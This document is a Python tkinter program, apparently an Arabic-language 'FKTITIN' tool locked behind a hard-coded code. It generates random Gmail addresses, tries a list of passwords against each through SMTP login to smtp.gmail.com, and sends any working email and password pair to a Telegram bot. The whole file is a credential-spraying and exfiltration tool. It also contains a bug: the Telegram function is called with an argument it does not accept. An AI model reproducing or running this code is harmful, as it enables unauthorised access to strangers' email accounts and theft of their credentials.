import tkinter as tk
from tkinter import messagebox
import random
import string
import smtplib
import requests
import os

# دالة للتحقق من الكود السري
def check_secret():
    if entry_code.get() == "FKTITIN12":
        messagebox.showinfo("نجاح", "✅ تم إدخال الكود الصحيح!")
        open_main_window()  # فتح النافذة الرئيسية بعد نجاح الإدخال
        root.destroy()  # إغلاق النافذة الأولى
    else:
        messagebox.showerror("خطأ", "❌ الكود غير صحيح!")

# دالة لإرسال الرسالة إلى تيليجرام
def send_to_telegram():
    token = entry_token.get().strip()
    chat_id = entry_chat_id.get().strip()
    message = entry_message.get().strip()
    
    if not token or not chat_id or not message:
        messagebox.showwarning("تحذير", "❗ يرجى إدخال جميع البيانات!")
        return
    
    url = f"https://api.telegram.org/bot{token}/sendMessage"
    payload = {"chat_id": chat_id, "text": message}
    
    response = requests.post(url, data=payload)
    
    if response.status_code == 200:
        messagebox.showinfo("نجاح", "✅ تم إرسال الرسالة بنجاح!")
    else:
        messagebox.showerror("خطأ", f"❌ فشل الإرسال! (رمز الخطأ: {response.status_code})")

# دالة لإنشاء الرسائل العشوائية
def generate_random_emails(count, domain="gmail.com"):
    """Generate random emails containing only English names with numbers"""
    names = [
        "Ahmed", "Sara", "Mohamed", "Layla", "Youssef", "Fatima", "Hassan", "Mariam", 
        "Karim", "Nada", "Ali", "Salma", "Abdullah", "Seif", "Jamal", "Nadia", 
        "Khadija", "Mahmoud", "Zahra", "Mousa", "Imane"
    ]
    emails = set()
    
    while len(emails) < count:
        name = random.choice(names)  # Choose a random name from the list
        random_digits = ''.join(random.choices(string.digits, k=5))  # Add random digits only
        email = f"{name}{random_digits}@{domain}"
        emails.add(email)
    
    return list(emails)

# دالة للتحقق من صحة البريد الإلكتروني وكلمة المرور باستخدام SMTP
def check_email_validity(email, passwords):
    """Check the validity of the email and password using SMTP"""
    for password in passwords:
        try:
            # Set up the connection with the SMTP server
            server = smtplib.SMTP('smtp.gmail.com', 587)
            server.starttls()
            server.login(email, password)
            server.quit()
            return password  # If successful, return the password
        except smtplib.SMTPAuthenticationError:
            continue  # Try another password in the list
    return None  # If no password works

# دالة للتعامل مع البيانات المدخلة في الواجهة
def process_data():
    num_emails = int(entry_num_emails.get())
    passwords = entry_passwords.get().split()
    
    # Generate random emails
    random_emails = generate_random_emails(num_emails)
    
    # Try to verify the email and password
    for email in random_emails:
        password = check_email_validity(email, passwords)
        if password:
            message = f"📧 {email} - 🔑 {password} (Valid data)"
            print(message)  # Print the data locally
            send_to_telegram(message)  # Send it to Telegram
        else:
            print(f"❌ {email} - No password worked")

# دالة لإنشاء النافذة الرئيسية بعد إدخال الكود
def open_main_window():
    main_window = tk.Tk()
    main_window.title("أداة FKTITIN")
    main_window.geometry("500x400")

    # إدخال التوكن
    tk.Label(main_window, text="🔹 أدخل التوكن:", font=("Arial", 12)).pack(pady=5)
    global entry_token
    entry_token = tk.Entry(main_window, font=("Arial", 12))
    entry_token.pack(pady=5)

    # إدخال Chat ID
    tk.Label(main_window, text="🔹 أدخل Chat ID:", font=("Arial", 12)).pack(pady=5)
    global entry_chat_id
    entry_chat_id = tk.Entry(main_window, font=("Arial", 12))
    entry_chat_id.pack(pady=5)

    # إدخال عدد الإيميلات
    tk.Label(main_window, text="🔹 أدخل عدد الإيميلات لتوليدها:", font=("Arial", 12)).pack(pady=5)
    global entry_num_emails
    entry_num_emails = tk.Entry(main_window, font=("Arial", 12))
    entry_num_emails.pack(pady=5)

    # إدخال كلمات المرور
    tk.Label(main_window, text="🔹 أدخل كلمات المرور لتجربتها:", font=("Arial", 12)).pack(pady=5)
    global entry_passwords
    entry_passwords = tk.Entry(main_window, font=("Arial", 12))
    entry_passwords.pack(pady=5)

    # زر المعالجة
    tk.Button(main_window, text="📩 بدء المعالجة", font=("Arial", 12), command=process_data).pack(pady=10)

    main_window.mainloop()

# إنشاء النافذة الأولى للتحقق من الكود السري
root = tk.Tk()
root.title("أداة FKTITIN")
root.geometry("300x200")

# إدخال الكود السري
tk.Label(root, text="🔑 أدخل الكود السري:", font=("Arial", 12)).pack(pady=10)
entry_code = tk.Entry(root, show="*", font=("Arial", 12))
entry_code.pack(pady=5)

# زر التحقق
tk.Button(root, text="تحقق ✅", font=("Arial", 12), command=check_secret).pack(pady=10)

# تشغيل النافذة
root.mainloop()
